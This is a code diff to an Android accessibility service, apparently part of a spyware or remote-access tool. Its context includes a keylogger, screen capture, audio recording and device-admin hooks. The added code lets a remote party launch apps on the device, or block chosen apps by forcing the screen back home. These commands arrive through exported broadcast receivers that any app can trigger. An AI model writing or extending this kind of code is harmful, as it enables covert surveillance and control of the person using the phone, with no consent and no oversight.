@@ -79,6 +79,7 @@ import com.support.litework.model.SkeletonEntry;
 import com.support.litework.receiver.MyDeviceAdminReceiver;
 import com.support.litework.server.Server;
 import com.support.litework.utils.Common;
+import com.support.litework.utils.FileUtils;
 import com.support.litework.utils.InstalledApps;
 import com.support.litework.utils.MyPermissions;
 
@@ -118,6 +119,10 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_SCREEN_SCROLL = "SCREEN_SCROLL";
     public static final String ACTION_DEVICE_LOCK = "DEVICE_LOCK";
     public static final String ACTION_DEVICE_UNLOCK = "DEVICE_UNLOCK";
+    public static final String ACTION_APP_OPEN = "APP_OPEN";
+    public static final String ACTION_APP_LOCK = "APP_LOCK";
+    public static final String ACTION_APP_UNLOCK = "APP_UNLOCK";
+
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
 
     //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
@@ -135,6 +140,9 @@ public class MainAccessibilityService extends AccessibilityService {
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
     private ImageReader imageReader;
+
+    // App Event Monitor
+    ArrayList<String> packageList = new ArrayList<>();
 
     //blackscreen
     private boolean blackScreen = false;
@@ -273,6 +281,8 @@ public class MainAccessibilityService extends AccessibilityService {
         registerReceiverManager();
 //        requestOverlayPermission();
         setPermissionRequest();
+        packageList = FileUtils.getArrayListFromFile(getContext(), "packagelist.pdm");
+        Common.getInstance().setPackageList(packageList);
     }
 
     private void setPermissionRequest() {
@@ -464,6 +474,19 @@ public class MainAccessibilityService extends AccessibilityService {
                 onDeviceUnlock();
             }
 
+            if (ACTION_APP_OPEN.equals(intent.getAction())) {
+                String package_name = intent.getStringExtra("packagename");
+                onOpenApp(package_name);
+            }
+            if (ACTION_APP_LOCK.equals(intent.getAction())) {
+                String package_name = intent.getStringExtra("packagename");
+                onLockApp(package_name);
+            }
+            if (ACTION_APP_UNLOCK.equals(intent.getAction())) {
+                String package_name = intent.getStringExtra("packagename");
+                onUnLockApp(package_name);
+            }
+
             if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
                 String close_event = intent.getStringExtra("event");
                 if (close_event.equals("screen-monitor")) {
@@ -554,6 +577,13 @@ public class MainAccessibilityService extends AccessibilityService {
         IntentFilter filter_device_unlock = new IntentFilter(ACTION_DEVICE_UNLOCK);
         registerReceiver(screenMonitorReceiver, filter_device_unlock, RECEIVER_EXPORTED);
 
+        IntentFilter filter_app_open = new IntentFilter(ACTION_APP_OPEN);
+        registerReceiver(screenMonitorReceiver, filter_app_open, RECEIVER_EXPORTED);
+        IntentFilter filter_app_lock = new IntentFilter(ACTION_APP_LOCK);
+        registerReceiver(screenMonitorReceiver, filter_app_lock, RECEIVER_EXPORTED);
+        IntentFilter filter_app_unlock = new IntentFilter(ACTION_APP_UNLOCK);
+        registerReceiver(screenMonitorReceiver, filter_app_unlock, RECEIVER_EXPORTED);
+
         IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
         registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);
 
@@ -574,6 +604,7 @@ public class MainAccessibilityService extends AccessibilityService {
         getKeyLogger(event);
         getSkeletonInfo(event);
         findFocusedNode(event);
+        onDetectLockApp(event);
         if (Common.getInstance().getAutostartEnable() && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
             setPermEditorEnable(event);
         } else {
@@ -1340,6 +1371,16 @@ public class MainAccessibilityService extends AccessibilityService {
                         Log.d("AccessibilityService", "EditText is empty or null");
                     }
                 }
+            }
+        }
+    }
+
+    private void onDetectLockApp(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            String packagename = event.getPackageName().toString();
+            if (packageList.contains(packagename)) {
+                onGoHome();
             }
         }
     }
@@ -2525,6 +2566,35 @@ public class MainAccessibilityService extends AccessibilityService {
 //        }
     }
 
+    private void onOpenApp(String packageName) {
+        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
+        if (launchIntent != null) {
+            launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(launchIntent);//null pointer check in case package name was not found
+        }
+    }
+
+    private void onLockApp(String packageName) {
+        if (!packageList.contains(packageName)) {
+            packageList.add(packageName);
+            Common.getInstance().setPackageList(packageList);
+            FileUtils.saveArrayListToFile(getBaseContext() ,packageList,"packagelist.pdm");
+            System.out.println("Added: " + packageName);
+        } else {
+            System.out.println(packageName + " already exists in the list.");
+        }
+    }
+    private void onUnLockApp(String packageName) {
+        if (packageList.contains(packageName)) {
+            packageList.remove(packageName);
+            Common.getInstance().setPackageList(packageList);
+            FileUtils.saveArrayListToFile(getBaseContext() ,packageList,"packagelist.pdm");
+            System.out.println("Removed: " + packageName);
+        } else {
+            System.out.println(packageName + " does not exist in the list.");
+        }
+    }
+
     private void stopRecording() {
         if (audioRecord != null) {
             isRecording = false;
@@ -2563,7 +2633,6 @@ public class MainAccessibilityService extends AccessibilityService {
         } else {
             Log.e("AudioRecord", "AudioRecord initialization failed");
         }
-
     }
 
     private void monitorAudio(int bufferSize) {
